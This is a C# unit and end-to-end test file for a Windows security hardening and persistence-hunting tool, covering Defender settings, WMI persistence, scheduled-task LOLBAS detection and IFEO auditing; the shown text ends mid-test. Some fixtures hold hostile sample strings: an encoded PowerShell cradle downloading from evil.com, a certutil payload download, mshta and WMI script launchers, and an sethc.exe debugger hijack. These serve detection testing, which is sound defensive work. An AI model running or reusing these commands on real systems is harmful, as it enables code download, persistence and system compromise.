// ─────────────────────────────────────────────────────────────────────────────
// LogicFlow.Tests.E2E – SecurityHardeningE2ETests
// Comprehensive End-to-End (E2E) Opaque-Box Test Suite for Security Hardening,
// Persistence Threat Hunter, DNS & Hosts File Guard, and Security CLI Commands.
// Implementing 4 Tiers:
//   Tier 1: Feature Coverage (F1 to F15)
//   Tier 2: Boundary & Corner Cases (BVA & Adversarial Edge Conditions)
//   Tier 3: Cross-Feature Combinations & Pairwise Integration
//   Tier 4: Real-World Application Scenarios (Scenarios 1 to 5)
// DelgadoLogic.Tech Proprietary Test Framework
// ─────────────────────────────────────────────────────────────────────────────

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Security;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;
using LogicFlow.Sentinel;
using Microsoft.Win32;
using Moq;
using Xunit;

namespace LogicFlow.Tests.E2E
{
    [Collection("CliConsoleExecution")]
    public class SecurityHardeningE2ETests : IDisposable
    {
        private readonly string _testSandboxDirectory;
        private static readonly Assembly CliAssembly = LoadCliAssembly();
        private static readonly Type CliContextType = CliAssembly.GetType("LogicFlow.CLI.Framework.CliContext")!;
        private static readonly Type SecurityCommandsType = CliAssembly.GetType("LogicFlow.CLI.Commands.SecurityCommands")!;

        public SecurityHardeningE2ETests()
        {
            _testSandboxDirectory = Path.Combine(Path.GetTempPath(), "LogicFlow_E2E_" + Guid.NewGuid().ToString("N"));
            Directory.CreateDirectory(_testSandboxDirectory);
        }

        public void Dispose()
        {
            try
            {
                if (Directory.Exists(_testSandboxDirectory))
                {
                    Directory.Delete(_testSandboxDirectory, true);
                }
            }
            catch { /* Best effort cleanup */ }
        }

        #region CLI Test Invocation Helpers

        private static Assembly LoadCliAssembly()
        {
            try
            {
                return Assembly.Load("lf");
            }
            catch
            {
                var dir = new DirectoryInfo(AppContext.BaseDirectory);
                while (dir != null)
                {
                    string cliRel = Path.Combine(dir.FullName, "src", "LogicFlow.CLI", "bin", "Release", "net8.0-windows", "lf.dll");
                    if (File.Exists(cliRel)) return Assembly.LoadFrom(cliRel);

                    string cliDebug = Path.Combine(dir.FullName, "src", "LogicFlow.CLI", "bin", "Debug", "net8.0-windows", "lf.dll");
                    if (File.Exists(cliDebug)) return Assembly.LoadFrom(cliDebug);

                    dir = dir.Parent;
                }

                throw new InvalidOperationException($"Could not find lf.dll assembly for testing. BaseDirectory: {AppContext.BaseDirectory}");
            }
        }

        private static object CreateCliContext(bool isJson = false, bool isForce = false, bool isSilent = false, params string[] args)
        {
            var ctx = Activator.CreateInstance(CliContextType)!;
            CliContextType.GetProperty("IsJson")!.SetValue(ctx, isJson);
            CliContextType.GetProperty("IsForce")!.SetValue(ctx, isForce);
            CliContextType.GetProperty("IsSilent")!.SetValue(ctx, isSilent);
            CliContextType.GetProperty("RemainingArgs")!.SetValue(ctx, args);
            return ctx;
        }

        private static readonly object ConsoleSyncLock = new();

        private static (int ExitCode, string StdOut, string StdErr) RunSecurityCommand(object ctx, string command)
        {
            lock (ConsoleSyncLock)
            {
                var runMethod = SecurityCommandsType.GetMethod("Run", BindingFlags.Public | BindingFlags.Static)!;
                var originalOut = Console.Out;
                var originalErr = Console.Error;
                using var swOut = new StringWriter();
                using var swErr = new StringWriter();

                try
                {
                    Console.SetOut(swOut);
                    Console.SetError(swErr);
                    int exitCode = (int)runMethod.Invoke(null, new[] { ctx, command })!;
                    return (exitCode, swOut.ToString(), swErr.ToString());
                }
                finally
                {
                    Console.SetOut(originalOut);
                    Console.SetError(originalErr);
                }
            }
        }

        #endregion

        // ═════════════════════════════════════════════════════════════════════
        // TIER 1: FEATURE COVERAGE (Features 1 through 15)
        // ═════════════════════════════════════════════════════════════════════

        #region Tier 1 - Feature 1: Defender ASR Catalog (16 Rules)

        [Fact]
        public void T1_F1_01_DefenderAsrCatalog_Contains16EnterpriseRulesWithValidMetadata()
        {
            var rules = DefenderHardenerEngine.KnownAsrRules;
            Assert.Equal(16, rules.Count);
            Assert.All(rules, r =>
            {
                Assert.True(Guid.TryParse(r.Guid, out _));
                Assert.False(string.IsNullOrWhiteSpace(r.Name));
                Assert.False(string.IsNullOrWhiteSpace(r.Description));
                Assert.False(string.IsNullOrWhiteSpace(r.Category));
            });
        }

        [Fact]
        public void T1_F1_02_DefenderAsrCatalog_FindRule_ResolvesCanonicalAndBracedGuids()
        {
            const string emailGuid = "BE9BA2D9-53EA-4CDC-84E5-9B1EEEE46550";
            var r1 = DefenderHardenerEngine.FindRule(emailGuid);
            var r2 = DefenderHardenerEngine.FindRule("{" + emailGuid + "}");
            var r3 = DefenderHardenerEngine.FindRule(emailGuid.ToLowerInvariant());

            Assert.NotNull(r1);
            Assert.NotNull(r2);
            Assert.NotNull(r3);
            Assert.Equal("Block Executables from Email", r1.Name);
            Assert.Equal(r1.Guid, r2.Guid);
            Assert.Equal(r1.Guid, r3.Guid);
        }

        [Fact]
        public void T1_F1_03_DefenderAsrCatalog_FindRule_ResolvesAliasGuidsAndFriendlyNames()
        {
            var r1 = DefenderHardenerEngine.FindRule("5BEB8E2C-1807-453E-A1E0-8D3AEAB4C88F"); // Obfuscated scripts alias
            var r2 = DefenderHardenerEngine.FindRule("Block LSASS Credential Theft");
            var r3 = DefenderHardenerEngine.FindRule("Ransomware");

            Assert.NotNull(r1);
            Assert.Equal("Block Obfuscated Scripts", r1.Name);
            Assert.NotNull(r2);
            Assert.Equal("9E6C4E1F-7D60-472F-BA1A-A39EF669E4B2", r2.Guid);
            Assert.NotNull(r3);
            Assert.Equal("Advanced Ransomware Protection", r3.Name);
        }

        [Fact]
        public async Task T1_F1_04_DefenderAsrCatalog_SetAsrRuleStateAsync_ModifiesStateAccurately()
        {
            var mockReg = new Mock<IRegistryService>();
            var mockRunner = new Mock<IProcessRunner>();
            var engine = new DefenderHardenerEngine(mockReg.Object, mockRunner.Object);

            const string guid = "D4F940AB-401B-4EFC-AADC-AD5F3C50688A"; // Office child processes
            var res = await engine.SetAsrRuleStateAsync(guid, AsrRuleState.Block);

            Assert.True(res.Success);
            mockReg.Verify(r => r.SetDword(RegistryHive.LocalMachine, @"SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\ASR\Rules", guid, 1), Times.Once);
        }

        [Fact]
        public async Task T1_F1_05_DefenderAsrCatalog_ToggleAsrRuleAsync_TogglesBetweenBlockAndOff()
        {
            var mockReg = new Mock<IRegistryService>();
            var mockRunner = new Mock<IProcessRunner>();
            const string guid = "BE9BA2D9-53EA-4CDC-84E5-9B1EEEE46550";

            mockReg.Setup(r => r.GetDword(RegistryHive.LocalMachine, It.IsAny<string>(), guid)).Returns(1); // Currently Block
            var engine = new DefenderHardenerEngine(mockReg.Object, mockRunner.Object);

            var res = await engine.ToggleAsrRuleAsync(guid);
            Assert.True(res.Success);
            mockReg.Verify(r => r.SetDword(RegistryHive.LocalMachine, It.IsAny<string>(), guid, 0), Times.Once);
        }

        #endregion

        #region Tier 1 - Feature 2: Defender PUA & Cloud Protection

        [Fact]
        public async Task T1_F2_01_DefenderPuaCloud_SetPuaProtectionAsync_EnablesPuaDwords()
        {
            var mockReg = new Mock<IRegistryService>();
            var mockRunner = new Mock<IProcessRunner>();
            var engine = new DefenderHardenerEngine(mockReg.Object, mockRunner.Object);

            var res = await engine.SetPuaProtectionAsync(true, auditOnly: false);

            Assert.True(res.Success);
            mockReg.Verify(r => r.SetDword(RegistryHive.LocalMachine, @"SOFTWARE\Policies\Microsoft\Windows Defender", "PUAProtection", 1), Times.Once);
            mockReg.Verify(r => r.SetDword(RegistryHive.LocalMachine, @"SOFTWARE\Policies\Microsoft\Windows Defender\MpEngine", "MpEnablePus", 1), Times.Once);
        }

        [Fact]
        public async Task T1_F2_02_DefenderPuaCloud_SetPuaProtectionAsync_EnablesAuditMode()
        {
            var mockReg = new Mock<IRegistryService>();
            var mockRunner = new Mock<IProcessRunner>();
            var engine = new DefenderHardenerEngine(mockReg.Object, mockRunner.Object);

            var res = await engine.SetPuaProtectionAsync(true, auditOnly: true);

            Assert.True(res.Success);
            mockReg.Verify(r => r.SetDword(RegistryHive.LocalMachine, @"SOFTWARE\Policies\Microsoft\Windows Defender", "PUAProtection", 2), Times.Once);
        }

        [Fact]
        public async Task T1_F2_03_DefenderPuaCloud_SetCloudProtectionAsync_EnablesAdvancedMaps()
        {
            var mockReg = new Mock<IRegistryService>();
            var mockRunner = new Mock<IProcessRunner>();
            var engine = new DefenderHardenerEngine(mockReg.Object, mockRunner.Object);

            var res = await engine.SetCloudProtectionAsync(true);

            Assert.True(res.Success);
            mockReg.Verify(r => r.SetDword(RegistryHive.LocalMachine, @"SOFTWARE\Policies\Microsoft\Windows Defender\Spynet", "SpynetReporting", 2), Times.Once);
        }

        [Fact]
        public async Task T1_F2_04_DefenderPuaCloud_SetBlockAtFirstSightAsync_ConfiguresConsentAndDisablesBafsBlock()
        {
            var mockReg = new Mock<IRegistryService>();
            var mockRunner = new Mock<IProcessRunner>();
            var engine = new DefenderHardenerEngine(mockReg.Object, mockRunner.Object);

            var res = await engine.SetBlockAtFirstSightAsync(true);

            Assert.True(res.Success);
            mockReg.Verify(r => r.SetDword(RegistryHive.LocalMachine, @"SOFTWARE\Policies\Microsoft\Windows Defender\Spynet", "SubmitSamplesConsent", 1), Times.Once);
            mockReg.Verify(r => r.SetDword(RegistryHive.LocalMachine, @"SOFTWARE\Policies\Microsoft\Windows Defender\Spynet", "DisableBlockAtFirstSight", 0), Times.Once);
        }

        [Fact]
        public async Task T1_F2_05_DefenderPuaCloud_GetStatusAsync_ReflectsActivePuaAndCloudToggles()
        {
            var mockReg = new Mock<IRegistryService>();
            var mockRunner = new Mock<IProcessRunner>();
            mockReg.Setup(r => r.GetDword(RegistryHive.LocalMachine, @"SOFTWARE\Policies\Microsoft\Windows Defender", "PUAProtection")).Returns(1);
            mockReg.Setup(r => r.GetDword(RegistryHive.LocalMachine, @"SOFTWARE\Policies\Microsoft\Windows Defender\Spynet", "SpynetReporting")).Returns(2);
            mockReg.Setup(r => r.GetDword(RegistryHive.LocalMachine, @"SOFTWARE\Policies\Microsoft\Windows Defender\Spynet", "SubmitSamplesConsent")).Returns(1);
            mockReg.Setup(r => r.GetDword(RegistryHive.LocalMachine, @"SOFTWARE\Policies\Microsoft\Windows Defender\Spynet", "DisableBlockAtFirstSight")).Returns(0);
            mockReg.Setup(r => r.GetValues(RegistryHive.LocalMachine, It.IsAny<string>())).Returns(new Dictionary<string, object>());

            var engine = new DefenderHardenerEngine(mockReg.Object, mockRunner.Object);
            var status = await engine.GetStatusAsync();

            Assert.True(status.IsPuaProtectionEnabled);
            Assert.True(status.IsCloudProtectionEnabled);
            Assert.True(status.IsBlockAtFirstSightEnabled);
        }

        #endregion

        #region Tier 1 - Feature 3: Controlled Folder Access

        [Fact]
        public async Task T1_F3_01_ControlledFolderAccess_SetControlledFolderAccessAsync_EnablesBlockMode()
        {
            var mockReg = new Mock<IRegistryService>();
            var mockRunner = new Mock<IProcessRunner>();
            var engine = new DefenderHardenerEngine(mockReg.Object, mockRunner.Object);

            var res = await engine.SetControlledFolderAccessAsync(true, auditOnly: false);

            Assert.True(res.Success);
            mockReg.Verify(r => r.SetDword(RegistryHive.LocalMachine, @"SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\Controlled Folder Access", "EnableControlledFolderAccess", 1), Times.Once);
        }

        [Fact]
        public async Task T1_F3_02_ControlledFolderAccess_SetControlledFolderAccessAsync_EnablesAuditMode()
        {
            var mockReg = new Mock<IRegistryService>();
            var mockRunner = new Mock<IProcessRunner>();
            var engine = new DefenderHardenerEngine(mockReg.Object, mockRunner.Object);

            var res = await engine.SetControlledFolderAccessAsync(true, auditOnly: true);

            Assert.True(res.Success);
            mockReg.Verify(r => r.SetDword(RegistryHive.LocalMachine, @"SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\Controlled Folder Access", "EnableControlledFolderAccess", 2), Times.Once);
        }

        [Fact]
        public async Task T1_F3_03_ControlledFolderAccess_SetControlledFolderAccessAsync_DisablesCfa()
        {
            var mockReg = new Mock<IRegistryService>();
            var mockRunner = new Mock<IProcessRunner>();
            var engine = new DefenderHardenerEngine(mockReg.Object, mockRunner.Object);

            var res = await engine.SetControlledFolderAccessAsync(false);

            Assert.True(res.Success);
            mockReg.Verify(r => r.SetDword(RegistryHive.LocalMachine, @"SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\Controlled Folder Access", "EnableControlledFolderAccess", 0), Times.Once);
        }

        [Fact]
        public async Task T1_F3_04_ControlledFolderAccess_GetStatusAsync_ReadsCfaState()
        {
            var mockReg = new Mock<IRegistryService>();
            var mockRunner = new Mock<IProcessRunner>();
            mockReg.Setup(r => r.GetDword(RegistryHive.LocalMachine, @"SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\Controlled Folder Access", "EnableControlledFolderAccess")).Returns(1);
            mockReg.Setup(r => r.GetValues(RegistryHive.LocalMachine, It.IsAny<string>())).Returns(new Dictionary<string, object>());

            var engine = new DefenderHardenerEngine(mockReg.Object, mockRunner.Object);
            var status = await engine.GetStatusAsync();

            Assert.True(status.IsControlledFolderAccessEnabled);
        }

        [Fact]
        public async Task T1_F3_05_ControlledFolderAccess_RevertToDefaultsAsync_DeletesCfaKey()
        {
            var mockReg = new Mock<IRegistryService>();
            var mockRunner = new Mock<IProcessRunner>();
            var engine = new DefenderHardenerEngine(mockReg.Object, mockRunner.Object);

            var res = await engine.RevertToDefaultsAsync();

            Assert.True(res.Success);
            mockReg.Verify(r => r.DeleteValue(RegistryHive.LocalMachine, @"SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\Controlled Folder Access", "EnableControlledFolderAccess"), Times.Once);
        }

        #endregion

        #region Tier 1 - Feature 4: MpCmdRun Scan Triggers

        [Fact]
        public void T1_F4_01_MpCmdRun_LocateMpCmdRun_DiscoversPlatformUpdatesDirectory()
        {
            var mockReg = new Mock<IRegistryService>();
            var mockRunner = new Mock<IProcessRunner>();
            var platformBase = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Microsoft", "Windows Defender", "Platform");
            mockRunner.Setup(r => r.DirectoryExists(platformBase)).Returns(true);
            mockRunner.Setup(r => r.GetDirectories(platformBase)).Returns(new[] { Path.Combine(platformBase, "4.18.24080.9-0") });
            var candidate = Path.Combine(platformBase, "4.18.24080.9-0", "MpCmdRun.exe");
            mockRunner.Setup(r => r.FileExists(candidate)).Returns(true);

            var engine = new DefenderHardenerEngine(mockReg.Object, mockRunner.Object);
            var path = engine.LocateMpCmdRun();

            Assert.Equal(candidate, path);
        }

        [Fact]
        public void T1_F4_02_MpCmdRun_LocateMpCmdRun_FallsBackToProgramFiles()
        {
            var mockReg = new Mock<IRegistryService>();
            var mockRunner = new Mock<IProcessRunner>();
            mockRunner.Setup(r => r.DirectoryExists(It.IsAny<string>())).Returns(false);
            var progFiles = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "Windows Defender", "MpCmdRun.exe");
            mockRunner.Setup(r => r.FileExists(progFiles)).Returns(true);

            var engine = new DefenderHardenerEngine(mockReg.Object, mockRunner.Object);
            var path = engine.LocateMpCmdRun();

            Assert.Equal(progFiles, path);
        }

        [Fact]
        public async Task T1_F4_03_MpCmdRun_TriggerScanAsync_QuickScan_ExecutesWithScanType1()
        {
            var mockReg = new Mock<IRegistryService>();
            var mockRunner = new Mock<IProcessRunner>();
            var progFiles = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "Windows Defender", "MpCmdRun.exe");
            mockRunner.Setup(r => r.FileExists(progFiles)).Returns(true);
            mockRunner.Setup(r => r.RunAsync(progFiles, "-Scan -ScanType 1", It.IsAny<CancellationToken>()))
                .ReturnsAsync(new ProcessExecutionResult { ExitCode = 0, StandardOutput = "Quick Scan Finished." });

            var engine = new DefenderHardenerEngine(mockReg.Object, mockRunner.Object);
            var res = await engine.TriggerScanAsync(DefenderScanType.Quick);

            Assert.True(res.Success);
            Assert.Equal(0, res.ExitCode);
            Assert.Equal(DefenderScanType.Quick, res.ScanType);
        }

        [Fact]
        public async Task T1_F4_04_MpCmdRun_TriggerScanAsync_FullScan_ExecutesWithScanType2()
        {
            var mockReg = new Mock<IRegistryService>();
            var mockRunner = new Mock<IProcessRunner>();
            var progFiles = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "Windows Defender", "MpCmdRun.exe");
            mockRunner.Setup(r => r.FileExists(progFiles)).Returns(true);
            mockRunner.Setup(r => r.RunAsync(progFiles, "-Scan -ScanType 2", It.IsAny<CancellationToken>()))
                .ReturnsAsync(new ProcessExecutionResult { ExitCode = 0, StandardOutput = "Full Scan Finished." });

            var engine = new DefenderHardenerEngine(mockReg.Object, mockRunner.Object);
            var res = await engine.TriggerScanAsync(DefenderScanType.Full);

            Assert.True(res.Success);
            Assert.Equal(DefenderScanType.Full, res.ScanType);
        }

        [Fact]
        public async Task T1_F4_05_MpCmdRun_TriggerScanAsync_OfflineBoot_InvokesStartMpWDOScan()
        {
            var mockReg = new Mock<IRegistryService>();
            var mockRunner = new Mock<IProcessRunner>();
            mockRunner.Setup(r => r.RunAsync("powershell.exe", It.Is<string>(s => s.Contains("Start-MpWDOScan")), It.IsAny<CancellationToken>()))
                .ReturnsAsync(new ProcessExecutionResult { ExitCode = 0, StandardOutput = "WDO Initiated" });

            var engine = new DefenderHardenerEngine(mockReg.Object, mockRunner.Object);
            var res = await engine.TriggerScanAsync(DefenderScanType.OfflineBoot);

            Assert.True(res.Success);
            Assert.Equal(DefenderScanType.OfflineBoot, res.ScanType);
        }

        #endregion

        #region Tier 1 - Feature 5: WMI Persistence Audit & Remediation

        [Fact]
        public async Task T1_F5_01_WmiPersistence_ScanAsync_DetectsCommandLineEventConsumer()
        {
            var mockWmi = new Mock<IWmiSubscriptionService>();
            mockWmi.Setup(w => w.GetConsumers()).Returns(new List<WmiEventConsumerInfo>
            {
                new() { Name = "BackdoorConsumer", ConsumerType = "CommandLineEventConsumer", CommandLineTemplate = "cmd.exe /c calc.exe" }
            });
            mockWmi.Setup(w => w.GetFilters()).Returns(new List<WmiEventFilterInfo>
            {
                new() { Name = "BackdoorFilter", Query = "SELECT * FROM __InstanceCreationEvent" }
            });
            mockWmi.Setup(w => w.GetBindings()).Returns(new List<WmiBindingInfo>
            {
                new() { ConsumerName = "BackdoorConsumer", FilterName = "BackdoorFilter" }
            });

            var engine = new PersistenceScannerEngine(
                new Mock<IPersistenceRegistryService>().Object,
                mockWmi.Object,
                new Mock<IScheduledTaskService>().Object,
                new Mock<IProcessProvider>().Object,
                new Mock<IFileSystemProvider>().Object,
                new Mock<IDigitalSignatureValidator>().Object);

            var report = await engine.ScanAsync();
            var threat = Assert.Single(report.Threats, t => t.Category == "WMI Persistence");
            Assert.Contains("BackdoorConsumer", threat.Name);
            Assert.Equal(ThreatSeverity.High, threat.Severity);
        }

        [Fact]
        public async Task T1_F5_02_WmiPersistence_ScanAsync_DetectsActiveScriptEventConsumer()
        {
            var mockWmi = new Mock<IWmiSubscriptionService>();
            mockWmi.Setup(w => w.GetConsumers()).Returns(new List<WmiEventConsumerInfo>
            {
                new() { Name = "ScriptPayload", ConsumerType = "ActiveScriptEventConsumer", ScriptText = "CreateObject(\"WScript.Shell\").Run \"evil.exe\"" }
            });
            mockWmi.Setup(w => w.GetFilters()).Returns(new List<WmiEventFilterInfo>());
            mockWmi.Setup(w => w.GetBindings()).Returns(new List<WmiBindingInfo>());

            var engine = new PersistenceScannerEngine(
                new Mock<IPersistenceRegistryService>().Object,
                mockWmi.Object,
                new Mock<IScheduledTaskService>().Object,
                new Mock<IProcessProvider>().Object,
                new Mock<IFileSystemProvider>().Object,
                new Mock<IDigitalSignatureValidator>().Object);

            var report = await engine.ScanAsync();
            var threat = Assert.Single(report.Threats, t => t.Category == "WMI Persistence");
            Assert.Contains("ScriptPayload", threat.Name);
        }

        [Fact]
        public async Task T1_F5_03_WmiPersistence_ScanAsync_DetectsOrphanedConsumers()
        {
            var mockWmi = new Mock<IWmiSubscriptionService>();
            mockWmi.Setup(w => w.GetConsumers()).Returns(new List<WmiEventConsumerInfo>
            {
                new() { Name = "OrphanConsumer", ConsumerType = "CommandLineEventConsumer", CommandLineTemplate = "cmd.exe /c start dropper.exe" }
            });
            mockWmi.Setup(w => w.GetFilters()).Returns(new List<WmiEventFilterInfo>());
            mockWmi.Setup(w => w.GetBindings()).Returns(new List<WmiBindingInfo>());

            var engine = new PersistenceScannerEngine(
                new Mock<IPersistenceRegistryService>().Object,
                mockWmi.Object,
                new Mock<IScheduledTaskService>().Object,
                new Mock<IProcessProvider>().Object,
                new Mock<IFileSystemProvider>().Object,
                new Mock<IDigitalSignatureValidator>().Object);

            var report = await engine.ScanAsync();
            var threat = Assert.Single(report.Threats, t => t.Category == "WMI Persistence");
            Assert.Contains("Orphaned WMI Consumer", threat.Name);
        }

        [Fact]
        public async Task T1_F5_04_WmiPersistence_ScanAsync_DetectsOrphanedFilters()
        {
            var mockWmi = new Mock<IWmiSubscriptionService>();
            mockWmi.Setup(w => w.GetConsumers()).Returns(new List<WmiEventConsumerInfo>());
            mockWmi.Setup(w => w.GetFilters()).Returns(new List<WmiEventFilterInfo>
            {
                new() { Name = "OrphanFilter", Query = "SELECT * FROM Win32_Process" }
            });
            mockWmi.Setup(w => w.GetBindings()).Returns(new List<WmiBindingInfo>());

            var engine = new PersistenceScannerEngine(
                new Mock<IPersistenceRegistryService>().Object,
                mockWmi.Object,
                new Mock<IScheduledTaskService>().Object,
                new Mock<IProcessProvider>().Object,
                new Mock<IFileSystemProvider>().Object,
                new Mock<IDigitalSignatureValidator>().Object);

            var report = await engine.ScanAsync();
            var threat = Assert.Single(report.Threats, t => t.Category == "WMI Persistence");
            Assert.Contains("Orphaned WMI Filter", threat.Name);
        }

        [Fact]
        public async Task T1_F5_05_WmiPersistence_RemediateEntryAsync_CascadeDeletesBindingConsumerAndFilter()
        {
            var mockWmi = new Mock<IWmiSubscriptionService>();
            var engine = new PersistenceScannerEngine(
                new Mock<IPersistenceRegistryService>().Object,
                mockWmi.Object,
                new Mock<IScheduledTaskService>().Object,
                new Mock<IProcessProvider>().Object,
                new Mock<IFileSystemProvider>().Object,
                new Mock<IDigitalSignatureValidator>().Object);

            var entry = new PersistenceThreatItem
            {
                Id = "wmi_test",
                Category = "WMI Persistence",
                Name = "WMI Subscription",
                TargetType = "WMI",
                AdditionalData = "TestConsumer|TestFilter"
            };

            var res = await engine.RemediateEntryAsync(entry);
            Assert.True(res.Success);
            mockWmi.Verify(w => w.DeleteBinding("TestConsumer", "TestFilter"), Times.Once);
            mockWmi.Verify(w => w.DeleteConsumer("TestConsumer"), Times.Once);
            mockWmi.Verify(w => w.DeleteFilter("TestFilter"), Times.Once);
        }

        #endregion

        #region Tier 1 - Feature 6: Scheduled Task LOLBAS Hunter

        [Fact]
        public async Task T1_F6_01_ScheduledTaskHunter_ScanAsync_DetectsEncodedPowerShellTasks()
        {
            var mockTaskService = new Mock<IScheduledTaskService>();
            string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes("(New-Object Net.WebClient).DownloadString('http://evil.com/a.ps1')"));
            mockTaskService.Setup(t => t.QueryTasksAsync(It.IsAny<CancellationToken>())).ReturnsAsync(new List<ScheduledTaskInfo>
            {
                new() { TaskName = @"\Malware\EncodedTask", TaskToRun = $"powershell.exe -enc {b64}", HasSecurityDescriptor = true }
            });

            var engine = new PersistenceScannerEngine(
                new Mock<IPersistenceRegistryService>().Object,
                new Mock<IWmiSubscriptionService>().Object,
                mockTaskService.Object,
                new Mock<IProcessProvider>().Object,
                new Mock<IFileSystemProvider>().Object,
                new Mock<IDigitalSignatureValidator>().Object);

            var report = await engine.ScanAsync();
            var threat = Assert.Single(report.Threats, t => t.Category == "LOLBAS Scheduled Task");
            Assert.Equal(ThreatSeverity.Critical, threat.Severity);
            Assert.Contains("DownloadString", threat.CommandOrValue);
        }

        [Fact]
        public async Task T1_F6_02_ScheduledTaskHunter_ScanAsync_DetectsLolbasTriggers()
        {
            var mockTaskService = new Mock<IScheduledTaskService>();
            mockTaskService.Setup(t => t.QueryTasksAsync(It.IsAny<CancellationToken>())).ReturnsAsync(new List<ScheduledTaskInfo>
            {
                new() { TaskName = @"\Test\MshtaTask", TaskToRun = "mshta.exe javascript:alert(1)", HasSecurityDescriptor = true },
                new() { TaskName = @"\Test\CertutilTask", TaskToRun = "certutil.exe -urlcache -split -f http://test.com/payload.exe", HasSecurityDescriptor = true }
            });

            var engine = new PersistenceScannerEngine(
                new Mock<IPersistenceRegistryService>().Object,
                new Mock<IWmiSubscriptionService>().Object,
                mockTaskService.Object,
                new Mock<IProcessProvider>().Object,
                new Mock<IFileSystemProvider>().Object,
                new Mock<IDigitalSignatureValidator>().Object);

            var report = await engine.ScanAsync();
            var lolbasThreats = report.Threats.Where(t => t.Category == "LOLBAS Scheduled Task").ToList();
            Assert.Equal(2, lolbasThreats.Count);
        }

        [Fact]
        public async Task T1_F6_03_ScheduledTaskHunter_ScanAsync_DetectsUnquotedUserPaths()
        {
            var mockTaskService = new Mock<IScheduledTaskService>();
            mockTaskService.Setup(t => t.QueryTasksAsync(It.IsAny<CancellationToken>())).ReturnsAsync(new List<ScheduledTaskInfo>
            {
                new() { TaskName = @"\Test\Unquoted", TaskToRun = @"C:\Users\John Doe\AppData\Local\Program File\app.exe -run", HasSecurityDescriptor = true }
            });

            var engine = new PersistenceScannerEngine(
                new Mock<IPersistenceRegistryService>().Object,
                new Mock<IWmiSubscriptionService>().Object,
                mockTaskService.Object,
                new Mock<IProcessProvider>().Object,
                new Mock<IFileSystemProvider>().Object,
                new Mock<IDigitalSignatureValidator>().Object);

            var report = await engine.ScanAsync();
            var threat = Assert.Single(report.Threats, t => t.Category == "Vulnerable Scheduled Task");
            Assert.Contains("Unquoted Path in User Space", threat.Name);
        }

        [Fact]
        public async Task T1_F6_04_ScheduledTaskHunter_ScanAsync_DetectsGhostTasksMissingSecurityDescriptors()
        {
            var mockTaskService = new Mock<IScheduledTaskService>();
            mockTaskService.Setup(t => t.QueryTasksAsync(It.IsAny<CancellationToken>())).ReturnsAsync(new List<ScheduledTaskInfo>
            {
                new() { TaskName = @"\Stealth\GhostTask", TaskToRun = "cmd.exe /c evil.bat", HasSecurityDescriptor = false }
            });

            var engine = new PersistenceScannerEngine(
                new Mock<IPersistenceRegistryService>().Object,
                new Mock<IWmiSubscriptionService>().Object,
                mockTaskService.Object,
                new Mock<IProcessProvider>().Object,
                new Mock<IFileSystemProvider>().Object,
                new Mock<IDigitalSignatureValidator>().Object);

            var report = await engine.ScanAsync();
            var threat = Assert.Single(report.Threats, t => t.Category == "Ghost Scheduled Task");
            Assert.Equal(ThreatSeverity.Critical, threat.Severity);
        }

        [Fact]
        public async Task T1_F6_05_ScheduledTaskHunter_RemediateEntryAsync_ProtectsCoreWindowsTasks()
        {
            var mockTaskService = new Mock<IScheduledTaskService>();
            var engine = new PersistenceScannerEngine(
                new Mock<IPersistenceRegistryService>().Object,
                new Mock<IWmiSubscriptionService>().Object,
                mockTaskService.Object,
                new Mock<IProcessProvider>().Object,
                new Mock<IFileSystemProvider>().Object,
                new Mock<IDigitalSignatureValidator>().Object);

            var threat = new PersistenceThreatItem
            {
                Id = "task_core",
                Category = "LOLBAS Scheduled Task",
                Location = @"\Microsoft\Windows\DiskCleanup\SilentCleanup",
                TargetType = "Task"
            };

            var res = await engine.RemediateEntryAsync(threat);
            Assert.False(res.Success);
            Assert.Contains("protected Windows core", res.Message);
            mockTaskService.Verify(t => t.DeleteTaskAsync(It.IsAny<string>(), It.IsAny<CancellationToken>()), Times.Never);
        }

        #endregion

        #region Tier 1 - Feature 7: IFEO & AppInit Registry Auditor

        [Fact]
        public async Task T1_F7_01_IfeoAppInit_ScanAsync_DetectsAccessibilityDebuggerHooks()
        {
            var mockReg = new Mock<IPersistenceRegistryService>();
            string ifeoKey = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options";
            mockReg.Setup(r => r.GetSubKeyNames(RegistryHive.LocalMachine, RegistryView.Registry64, ifeoKey))
                .Returns(new[] { "sethc.exe" });
            mockReg.Setup(r => r.GetString(RegistryHive.LocalMachine, RegistryView.Registry64, $@"{ifeoKey}\sethc.exe", "Debugger"))
                .Returns(@"C:\Windows\System32\cmd.exe");

            var engine = new PersistenceScannerEngine(
                mockReg.Object,
                new Mock<IWmiSubscriptionService>().Object,
                new Mock<IScheduledTaskService>().Object,
                new Mock<IProcessProvider>().Object,
                new Mock<IFileSystemProvider>().Object,
                new Mock<IDigitalSignatureValidator>().Object);

            var report = await engine.ScanAsync();
            var threat = Assert.Single(report.Threats, t => t.Category == "IFEO Hijack");
            Assert.Equal(ThreatSeverity.Critical, threat.Severity);
            Assert.Contains("sethc.exe", threat.Name);
        }

        [Fact]
        public async Task T1_F7_02_IfeoAppInit_ScanAsync_InspectsBoth64And32BitViews()
        {
            var mockReg = new Mock<IPersistenceRegistryService>();
            string ifeoKey = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options";
            mockReg.Setup(r => r.GetSubKeyNames(RegistryHive.LocalMachine, RegistryView.Registry64, ifeoKey))
                .Returns(new[] { "notepad.exe" });
            mockReg.Setup(r => r.GetString(RegistryHive.LocalMachine, RegistryView.Registry64, $@"{ifeoKey}\notepad.exe", "Debugger"))
                .Returns(@"C:\hook64.exe");

